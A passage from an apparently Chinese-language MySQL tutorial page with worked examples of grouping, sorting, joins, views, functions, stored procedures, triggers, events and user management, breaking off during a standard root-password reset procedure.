class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; select classid, count(*) 数量 from students group by classid;<br>+---------+--------+<br>| classid | 数量   |<br>+---------+--------+<br>|       2 |      3 |<br>|       1 |      4 |<br>|       4 |      4 |<br>|       3 |      4 |<br>|       5 |      1 |<br>|       7 |      3 |<br>|       6 |      4 |<br>|    NULL |      2 |<br>+---------+--------+<br>8 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br><span class="hljs-comment">#分组统计</span><br>select classid,avg(age) as 平均年龄 from students <span class="hljs-built_in">where</span> classid &gt; 3 group by classid having 平均年龄 &gt;30 ;<br>select gender,avg(age) 平均年龄 from students group by gender having gender=<span class="hljs-string">&#x27;M&#x27;</span>;<br><br><span class="hljs-comment">#多个字段分组统计</span><br>select classid,gender,count(*) 数量 from students group by classid,gender; <br>select classid,gender,count(*) 数量 from students group by gender,classid;<br></code></pre></td></tr></table></figure><h4 id="范例：排序"><a href="#范例：排序" class="headerlink" title="范例：排序"></a>范例：排序</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#只取前3个</span><br>mysql&gt; select * from students order by age desc <span class="hljs-built_in">limit</span> 3;<br>+-------+-------------+-----+--------+---------+-----------+<br>| StuID | Name       | Age | Gender | ClassID | TeacherID |<br>+-------+-------------+-----+--------+---------+-----------+<br>|    25 | Sun Dasheng | 100 | M     |   NULL |     NULL |<br>|     3 | Xie Yanke   |  53 | M     |      2 |       16 |<br>|     6 | Shi Qing    |  46 | M     |      5 |     NULL |<br>+-------+-------------+-----+--------+---------+-----------+<br>3 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br><span class="hljs-comment">#跳过前3个只显示后续的2个</span><br>mysql&gt; select * from students order by age desc <span class="hljs-built_in">limit</span> 3,2;<br>+-------+--------------+-----+--------+---------+-----------+<br>| StuID | Name         | Age | Gender | ClassID | TeacherID |<br>+-------+--------------+-----+--------+---------+-----------+<br>|    13 | Tian Boguang |  33 | M     |       2 |     NULL |<br>|     4 | Ding Dian    |  32 | M     |       4 |        4 |<br>+-------+--------------+-----+--------+---------+-----------+<br>2 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure><h4 id="范例：分组和排序"><a href="#范例：分组和排序" class="headerlink" title="范例：分组和排序"></a>范例：分组和排序</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; select classid,count(*) 数量  from students group by classid order by 数量<br>;<br>+---------+--------+<br>| classid | 数量   |<br>+---------+--------+<br>|       5 |      1 |<br>|    NULL |      2 |<br>|       2 |      3 |<br>|       7 |      3 |<br>|       1 |      4 |<br>|       4 |      4 |<br>|       3 |      4 |<br>|       6 |      4 |<br>+---------+--------+<br>8 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure><h3 id="7-2-多表查询"><a href="#7-2-多表查询" class="headerlink" title="7.2 多表查询"></a>7.2 多表查询</h3><p>多表查询，即查询结果来自于多张表</p><blockquote><ul><li>子查询：在SQL语句嵌套着查询语句，性能较差，基于某语句的查询结果再次进行的查询</li><li>联合查询：UNION</li><li>交叉连接：笛卡尔乘积 CROSS JOIN</li><li>内连接：</li></ul><p>    等值连接：让表之间的字段以”等值”建立连接关系</p><p>    不等值连接</p><p>    自然连接：去掉重复列的等值连接 , 语法: <strong>FROM</strong> table1 <strong>NATURAL JOIN</strong> table2;</p><ul><li>外连接：</li></ul><p>    左外连接：FROM tb1 LEFT JOIN tb2 ON tb1.col=tb2.col</p><p>    右外连接：FROM tb1 RIGHT JOIN tb2 ON tb1.col=tb2.col</p><p>    完全外连接: FROM tb1 FULL OUTER JOIN tb2 ON tb1.col=tb2.col 注意:MySQL 不支持此SQL语法</p><ul><li>自连接：本表和本表进行连接查询</li></ul></blockquote><h4 id="7-2-1-子查询"><a href="#7-2-1-子查询" class="headerlink" title="7.2.1 子查询"></a>7.2.1 子查询</h4><blockquote><p>select 的执行结果，被其它SQL调用</p></blockquote><p>常用范例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#子查询：select 的执行结果，被其它SQL调用</span><br>SELECT Name,Age FROM students WHERE Age&gt;(SELECT avg(Age) FROM teachers);<br>update students <span class="hljs-built_in">set</span> Age=(SELECT avg(Age) FROM teachers) <span class="hljs-built_in">where</span> stuid=25;<br></code></pre></td></tr></table></figure><h4 id="7-2-2-联合查询"><a href="#7-2-2-联合查询" class="headerlink" title="7.2.2 联合查询"></a>7.2.2 联合查询</h4><blockquote><p>联合查询 Union 实现的条件,多个表的字段数量相同,字段名和数据类型可以不同,但一般数据类型是相同的</p></blockquote><p>常用范例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#多表纵向合并union</span><br>SELECT Name,Age FROM students UNION SELECT Name,Age FROM teachers;<br><br><span class="hljs-comment">#UNION ALL不会去重，UNION会去重</span><br>SELECT Name,Age FROM students UNION ALL SELECT Name,Age FROM teachers;<br></code></pre></td></tr></table></figure><h4 id="7-2-3-交叉连接"><a href="#7-2-3-交叉连接" class="headerlink" title="7.2.3 交叉连接"></a>7.2.3 交叉连接</h4><blockquote><p>cross join 即多表的记录之间做笛卡尔乘积组合，并且多个表的列横向合并相加, “雨露均沾”</p><p>比如: 第一个表3行4列,第二个表5行6列,cross join后的结果为3*5=15行,4+6=10列</p><p>交叉连接生成的记录可能会非常多,建议慎用</p></blockquote><p>常用范例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#横向合并，交叉连接（横向笛卡尔）</span><br><span class="hljs-comment">#方法一</span><br>MariaDB [hellodb]&gt; select * from students cross <span class="hljs-built_in">join</span> teachers;<br><br><span class="hljs-comment">#方法二</span><br>MariaDB [hellodb]&gt; select * from teachers , students;<br></code></pre></td></tr></table></figure><h4 id="7-2-4-内连接"><a href="#7-2-4-内连接" class="headerlink" title="7.2.4 内连接"></a>7.2.4 内连接</h4><blockquote><p>inner join 内连接取多个表的交集</p></blockquote><p>常用范例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#内连接inner join </span><br>MariaDB [hellodb]&gt; select * from students inner <span class="hljs-built_in">join</span> teachers on students.teacherid=teachers.tid;<br></code></pre></td></tr></table></figure><h4 id="7-2-5-左和右外连接"><a href="#7-2-5-左和右外连接" class="headerlink" title="7.2.5 左和右外连接"></a>7.2.5 左和右外连接</h4><blockquote><ul><li>左连接: 以左表为主根据条件查询右表数据﹐如果根据条件查询右表数据不存在使用null值填充</li><li>右连接: 以右表为主根据条件查询左表数据﹐如果根据条件查询左表数据不存在使用null值填充</li></ul></blockquote><p>常用范例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#左外连接，s和t是别名</span><br>MariaDB [hellodb]&gt; select s.stuid,s.name,s.age,s.teacherid,t.tid,t.name,t.age from students as s left outer <span class="hljs-built_in">join</span> teachers as t on s.teacherid=t.tid;<br><br><span class="hljs-comment">#左外连接扩展</span><br>MariaDB [hellodb]&gt; select * from students s left outer <span class="hljs-built_in">join</span> teachers t on s.teacherid=t.tid <span class="hljs-built_in">where</span> t.tid is null;<br></code></pre></td></tr></table></figure><h4 id="7-2-6-完全外连接"><a href="#7-2-6-完全外连接" class="headerlink" title="7.2.6 完全外连接"></a>7.2.6 完全外连接</h4><blockquote><p>MySQL 不支持完全外连接full outer join语法</p></blockquote><p> 常用范例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#MySQL不支持完全外连接 full outer join,利用以下方式法代替</span><br>MariaDB [hellodb]&gt; select * from students left <span class="hljs-built_in">join</span> teachers on students.teacherid=teachers.tid<br>    -&gt; union<br>    -&gt; select * from students right <span class="hljs-built_in">join</span> teachers on students.teacherid=teachers.tid;<br></code></pre></td></tr></table></figure><h4 id="7-2-7-自连接"><a href="#7-2-7-自连接" class="headerlink" title="7.2.7 自连接"></a>7.2.7 自连接</h4><blockquote><p>自连接, 即表自身连接自身</p></blockquote><p> 常用范例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#表</span><br>MariaDB [hellodb]&gt; select * from emp;<br>+------+----------+----------+<br>| <span class="hljs-built_in">id</span>   | name     | leaderid |<br>+------+----------+----------+<br>|    1 | mage     |     NULL |<br>|    2 | zhangsir |        1 |<br>|    3 | wang     |        2 |<br>|    4 | zhang    |        3 |<br>+------+----------+----------+<br>4 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br><span class="hljs-comment">#操作</span><br>MariaDB [hellodb]&gt; select e.name,l.name from emp as e inner <span class="hljs-built_in">join</span> emp as l on e.leaderid=l.id;<br>+----------+----------+<br>| name     | name     |<br>+----------+----------+<br>| zhangsir | mage     |<br>| wang     | zhangsir |<br>| zhang    | wang     |<br>+----------+----------+<br>3 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure><h3 id="7-3-SELECT-语句处理的顺序"><a href="#7-3-SELECT-语句处理的顺序" class="headerlink" title="7.3 SELECT 语句处理的顺序"></a>7.3 SELECT 语句处理的顺序</h3><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221025000056713-825473659.png"><img src="2927659-20221025000056713-825473659.png" alt="img"></a></p><p>SELECT语句的执行流程：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">FROM Clause --&gt; WHERE Clause --&gt; GROUP BY --&gt; HAVING Clause --&gt;SELECT --&gt; ORDER BY --&gt; LIMIT<br></code></pre></td></tr></table></figure><hr><h2 id="8-VIEW-视图"><a href="#8-VIEW-视图" class="headerlink" title="8 VIEW 视图"></a>8 VIEW 视图</h2><blockquote><p>视图：虚拟表，保存有实表的查询结果，相当于别名</p><p>利用视图,可以隐藏表的真实结构,在程序中利用视图进行查询,可以避免表结构的变化,而修改程序,降低程序和数据库之间的耦合度</p></blockquote><h3 id="创建方法"><a href="#创建方法" class="headerlink" title="创建方法"></a>创建方法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">CREATE   VIEW view_name [(column_list)]<br>     AS select_statement<br>     [WITH [CASCADED | LOCAL] CHECK OPTION]<br></code></pre></td></tr></table></figure><h3 id="查看视图定义"><a href="#查看视图定义" class="headerlink" title="查看视图定义"></a>查看视图定义</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">SHOW CREATE VIEW view_name <span class="hljs-comment">#只能看视图定义</span><br>SHOW CREATE TABLE view_name <span class="hljs-comment"># 可以查看表和视图</span><br></code></pre></td></tr></table></figure><h3 id="删除视图"><a href="#删除视图" class="headerlink" title="删除视图"></a>删除视图</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">DROP VIEW [IF EXISTS]<br>   view_name [, view_name] ...<br>    [RESTRICT | CASCADE]<br></code></pre></td></tr></table></figure><hr><h2 id="9-FUNCTION-函数"><a href="#9-FUNCTION-函数" class="headerlink" title="9 FUNCTION 函数"></a>9 FUNCTION 函数</h2><p>函数：分为系统内置函数和自定义函数</p><blockquote><p><strong>创建<strong><strong>UDF</strong></strong>语法</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">CREATE [AGGREGATE] FUNCTION function_name(parameter_name <span class="hljs-built_in">type</span>,[parameter_name <br><span class="hljs-built_in">type</span>,...])<br>   RETURNS &#123;STRING|INTEGER|REAL&#125;<br> runtime_body<br></code></pre></td></tr></table></figure><p>说明：</p><ul><li>参数可以有多个,也可以没有参数</li><li>无论有无参数，小括号（）是必须的</li><li>必须有且只有一个返回值</li></ul></blockquote><h3 id="查看函数列表"><a href="#查看函数列表" class="headerlink" title="查看函数列表"></a>查看函数列表</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">SHOW FUNCTION STATUS;<br></code></pre></td></tr></table></figure><h3 id="查看函数定义"><a href="#查看函数定义" class="headerlink" title="查看函数定义"></a>查看函数定义</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">SHOW CREATE FUNCTION function_name<br></code></pre></td></tr></table></figure><h3 id="删除UDF"><a href="#删除UDF" class="headerlink" title="删除UDF"></a>删除UDF</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">DROP FUNCTION function_name<br></code></pre></td></tr></table></figure><h3 id="调用自定义函数语法"><a href="#调用自定义函数语法" class="headerlink" title="调用自定义函数语法"></a>调用自定义函数语法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">SELECT function_name(parameter_value,...)<br></code></pre></td></tr></table></figure><p><strong>注意：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#默认MySQL8.0开启二进制日志,而不允许创建函数</span><br>mysql&gt; show variables like <span class="hljs-string">&#x27;log_bin_trust_function_creators&#x27;</span>;<br>+---------------------------------+-------+<br>| Variable_name                   | Value |<br>+---------------------------------+-------+<br>| log_bin_trust_function_creators | OFF   |<br>+---------------------------------+-------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br><span class="hljs-comment">#打开此变量允许二进制日志信息函数创建</span><br>mysql&gt; <span class="hljs-built_in">set</span> global log_bin_trust_function_creators=ON;<br>Query OK, 0 rows affected (0.00 sec)<br></code></pre></td></tr></table></figure><h3 id="使用范例-1"><a href="#使用范例-1" class="headerlink" title="使用范例"></a>使用范例</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#无参UDF</span><br>CREATE FUNCTION simpleFun() RETURNS VARCHAR(20) RETURN <span class="hljs-string">&quot;Hello World&quot;</span>;<br><br><span class="hljs-comment">#有参数UDF</span><br>DELIMITER //<br>CREATE FUNCTION deleteById(<span class="hljs-built_in">id</span> SMALLINT UNSIGNED) RETURNS VARCHAR(20)<br>BEGIN<br>     DELETE FROM students WHERE stuid = <span class="hljs-built_in">id</span>;<br>     RETURN (SELECT COUNT(*) FROM students);<br>END//<br>DELIMITER ;<br></code></pre></td></tr></table></figure><hr><h2 id="10-PROCEDURE-存储过程"><a href="#10-PROCEDURE-存储过程" class="headerlink" title="10 PROCEDURE 存储过程"></a>10 PROCEDURE 存储过程</h2><blockquote><p>存储过程：多表SQL的语句的集合，可以独立执行，存储过程保存在mysql.proc表中</p><p><strong>存储过程优势</strong></p><ul><li>存储过程把经常使用的SQL语句或业务逻辑封装起来,预编译保存在数据库中,当需要时从数据库中直接调</li><li>用,省去了编译的过程，提高了运行速度，同时降低网络数据传输量</li></ul><p><strong>存储过程与自定义函数的区别</strong></p><ul><li>存储过程实现的过程要复杂一些,而函数的针对性较强</li><li>存储过程可以有多个返回值,而自定义函数只有一个返回值</li><li>存储过程一般可独立执行,而函数往往是作为其他SQL语句的一部分来使用</li><li>无参数的存储过程执行过程中可以不加(),函数必须加 ( )</li></ul></blockquote><h3 id="创建存储过程"><a href="#创建存储过程" class="headerlink" title="创建存储过程"></a>创建存储过程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">CREATE PROCEDURE sp_name ([ proc_parameter [,proc_parameter ...]])<br>routime_body <br>proc_parameter : [IN|OUT|INOUT] parameter_name <span class="hljs-built_in">type</span><br><br>说明：其中IN表示输入参数，OUT表示输出参数，INOUT表示既可以输入也可以输出；<br>param_name表示参数名称；<span class="hljs-built_in">type</span>表示参数的类型<br></code></pre></td></tr></table></figure><h3 id="查看存储过程列表"><a href="#查看存储过程列表" class="headerlink" title="查看存储过程列表"></a>查看存储过程列表</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">SHOW PROCEDURE  STATUS;<br></code></pre></td></tr></table></figure><h3 id="调用存储过程"><a href="#调用存储过程" class="headerlink" title="调用存储过程"></a>调用存储过程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">CALL sp_name ([ proc_parameter [,proc_parameter ...]])<br></code></pre></td></tr></table></figure><h3 id="删除存储过程"><a href="#删除存储过程" class="headerlink" title="删除存储过程"></a>删除存储过程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">DROP PROCEDURE [IF EXISTS] sp_name<br></code></pre></td></tr></table></figure><h3 id="使用范例-2"><a href="#使用范例-2" class="headerlink" title="使用范例"></a>使用范例</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">delimiter //<br>CREATE PROCEDURE dorepeat(n INT)<br>BEGIN<br>    SET @i = 0;<br>    SET @<span class="hljs-built_in">sum</span> = 0;<br>    REPEAT SET @<span class="hljs-built_in">sum</span> = @<span class="hljs-built_in">sum</span>+@i; <br>    SET @i = @i + 1;<br>    UNTIL @i &gt; n END REPEAT;<br>END//<br>delimiter ;<br>CALL dorepeat(100);<br>SELECT @<span class="hljs-built_in">sum</span>;<br></code></pre></td></tr></table></figure><hr><h2 id="11-TRIGGER-触发器"><a href="#11-TRIGGER-触发器" class="headerlink" title="11 TRIGGER 触发器"></a>11 TRIGGER 触发器</h2><blockquote><p>触发器的执行不是由程序调用，也不是由手工启动，而是由事件来触发、激活从而实现执行</p></blockquote><h3 id="使用范例-3"><a href="#使用范例-3" class="headerlink" title="使用范例"></a>使用范例</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#创建触发器，在向学生表INSERT数据时，学生数增加，DELETE学生时，学生数减少</span><br>CREATE TABLE student_info (<br>    stu_id INT(11) NOT NULL AUTO_INCREMENT ,<br>    stu_name VARCHAR(255) DEFAULT NULL,<br>    PRIMARY KEY (stu_id)<br>);<br>CREATE TABLE student_count (<br>     student_count  INT(11) DEFAULT 0<br>);<br>INSERT INTO student_count VALUES(0);<br><br>CREATE TRIGGER trigger_student_count_insert<br>AFTER INSERT<br>ON student_info FOR EACH ROW<br>UPDATE student_count SET student_count=student_count+1;<br><br>CREATE TRIGGER trigger_student_count_delete<br>AFTER DELETE<br>ON student_info FOR EACH ROW<br>UPDATE student_count SET student_count=student_count-1;<br></code></pre></td></tr></table></figure><hr><h2 id="12-Event-事件"><a href="#12-Event-事件" class="headerlink" title="12 Event 事件"></a>12 Event 事件</h2><blockquote><p>事件（event）是MySQL在相应的时刻调用的过程式数据库对象。一个事件可调用一次，也可周期性的启动，它由一个特定的线程来管理的，也就是所谓的”事件调度器”。</p><p>事件和触发器类似，都是在某些事情发生的时候启动。当数据库上启动一条语句的时候，触发器就启动了，而事件是根据调度事件来启动的。由于它们彼此相似，所以事件也称为临时性触发器。</p><p>事件取代了原先只能由操作系统的计划任务来执行的工作，而且MySQL的事件调度器可以精确到每秒钟执行一个任务，而操作系统的计划任务（如：Linux下的CRON或Windows下的任务计划）只能精确到每分钟执行一次。</p><p><strong>事件的优缺点</strong></p><p>优点：一些对数据定时性操作不再依赖外部程序，而直接使用数据库本身提供的功能，可以实现每秒钟执行一个任务，这在一些对实时性要求较高的环境下就非常实用</p><p>缺点：定时触发，不可以直接调用</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#默认事件调度功能是关闭的,MySQL8.0默认是开启的</span><br>[root@localhost (none)]&gt; select @@event_scheduler;<br>+-------------------+<br>| @@event_scheduler |<br>+-------------------+<br>| ON                |<br>+-------------------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure><hr><h2 id="13-MySQL-用户管理"><a href="#13-MySQL-用户管理" class="headerlink" title="13 MySQL 用户管理"></a>13 MySQL 用户管理</h2><h3 id="相关数据库和表"><a href="#相关数据库和表" class="headerlink" title="相关数据库和表"></a>相关数据库和表</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">元数据数据库：mysql<br>系统授权表：db, host, user,columns_priv, tables_priv, procs_priv, proxies_priv<br></code></pre></td></tr></table></figure><h3 id="用户帐号"><a href="#用户帐号" class="headerlink" title="用户帐号"></a>用户帐号</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&#x27;USERNAME&#x27;</span>@<span class="hljs-string">&#x27;HOST&#x27;</span><br>@<span class="hljs-string">&#x27;HOST&#x27;</span>: 主机名： user1@<span class="hljs-string">&#x27;web1.magedu.org&#x27;</span><br>IP地址或Network <br> 通配符： %   _<br> 示例：wang@<span class="hljs-string">&#x27;172.16.%.%&#x27;</span>  <br>     user2@<span class="hljs-string">&#x27;192.168.1.%&#x27;</span><br>     mage@<span class="hljs-string">&#x27;10.0.0.0/255.255.0.0&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">CREATE USER <span class="hljs-string">&#x27;USERNAME&#x27;</span>@<span class="hljs-string">&#x27;HOST&#x27;</span> [IDENTIFIED BY <span class="hljs-string">&#x27;password&#x27;</span>]；<br><span class="hljs-comment">#示例:</span><br>create user test2@<span class="hljs-string">&#x27;10.0.0.%&#x27;</span> identified by 123456;<br>create user <span class="hljs-built_in">test</span>@<span class="hljs-string">&#x27;10.0.0.0/255.255.255.0&#x27;</span> identified by <span class="hljs-string">&#x27;123456&#x27;</span>;<br></code></pre></td></tr></table></figure><h3 id="用户重命名"><a href="#用户重命名" class="headerlink" title="用户重命名"></a>用户重命名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">RENAME USER old_user_name TO new_user_name;<br></code></pre></td></tr></table></figure><h3 id="删除用户"><a href="#删除用户" class="headerlink" title="删除用户"></a>删除用户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">DROP USER <span class="hljs-string">&#x27;USERNAME&#x27;</span>@<span class="hljs-string">&#x27;HOST&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="范例：删除默认的空用户"><a href="#范例：删除默认的空用户" class="headerlink" title="范例：删除默认的空用户"></a>范例：删除默认的空用户</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">DROP USER <span class="hljs-string">&#x27;&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span>;<br></code></pre></td></tr></table></figure><h4 id="范例：MySQL5-7和8-0-破解root密码"><a href="#范例：MySQL5-7和8-0-破解root密码" class="headerlink" title="范例：MySQL5.7和8.0 破解root密码"></a>范例：MySQL5.7和8.0 破解root密码</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#方法1、2实现前提步骤</span><br>[root@centos8 ~]<span class="hljs-comment"># vim /etc/my.cnf</span><br>[mysqld]<br>skip-grant-tables  <br>skip-networking  <span class="hljs-comment">#MySQL8.0不需要</span><br>[root@centos8 ~]<span class="hljs-comment"># systemctl restart mysqld</span><br><br><span class="hljs-comment">#方法1</span><br>mysql&gt; update mysql.user <span class="hljs-built_in">set</span> authentication_string=<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-built_in">where</span> user=<span class="hljs-string">&#x27;root&#x27;</span> and host=<span class="hljs-string">&#x27;localhost&#x27;</span>; <br><br><span class="hljs-comment">#方法2</span><br>mysql&gt; flush privileges;<br><span class="hljs-comment">#再执行下面任意一个命令</span><br>mysql&gt; alter user root@<span class="hljs-string">&#x27;localhost&#x27;</span> identified by <span class="hljs-string">&#x27;ubuntu&#x27;</span>;<br>mysql&gt; <span class="hljs-built_in">set</span> password <span class="hljs-keyword">for</span> root@<span class="hljs-string">&#x27;localhost&#x27;</span>=<span class="hljs-string">&#x27;ubuntu&#x27;</span>;<br>[root@centos8 